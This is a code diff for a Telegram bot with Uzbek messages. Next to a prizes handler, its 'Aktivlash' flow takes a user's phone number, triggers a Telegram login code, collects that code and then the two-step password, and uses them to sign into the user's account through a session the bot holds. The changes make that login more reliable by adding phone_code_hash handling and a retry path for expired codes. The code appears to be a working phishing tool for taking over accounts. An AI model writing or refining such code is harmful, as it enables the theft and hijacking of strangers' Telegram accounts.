@@ -200,6 +200,7 @@ async def prizes(msg: types.Message):
 
 # ================== AKTIVLASH ==================
 from telethon.sessions import StringSession
+from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError
 
 @dp.message_handler(lambda m: m.text == "✅ Aktivlash")
 async def activate(msg: types.Message):
@@ -217,15 +218,16 @@ async def login_flow(msg: types.Message):
 
     # ================== PHONE ==================
     if state["step"] == "phone":
-        # 🔐 STRING SESSION BILAN CLIENT
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
-        await client.send_code_request(text)
+
+        sent = await client.send_code_request(text)
 
         state.update({
             "step": "code",
             "phone": text,
-            "client": client
+            "client": client,
+            "phone_code_hash": sent.phone_code_hash
         })
 
         await msg.answer("🔐 Telegram kodi yuborildi")
@@ -236,8 +238,14 @@ async def login_flow(msg: types.Message):
         try:
             await state["client"].sign_in(
                 phone=state["phone"],
-                code=text
+                code=text,
+                phone_code_hash=state["phone_code_hash"]
             )
+        except PhoneCodeExpiredError:
+            await msg.answer("⛔️ Kod eskirib ketdi. Qayta /Aktivlash bosing.")
+            await state["client"].disconnect()
+            sessions.pop(uid, None)
+            return
         except SessionPasswordNeededError:
             state["step"] = "password"
             await msg.answer("🔑 2 bosqichli parolni yuboring")
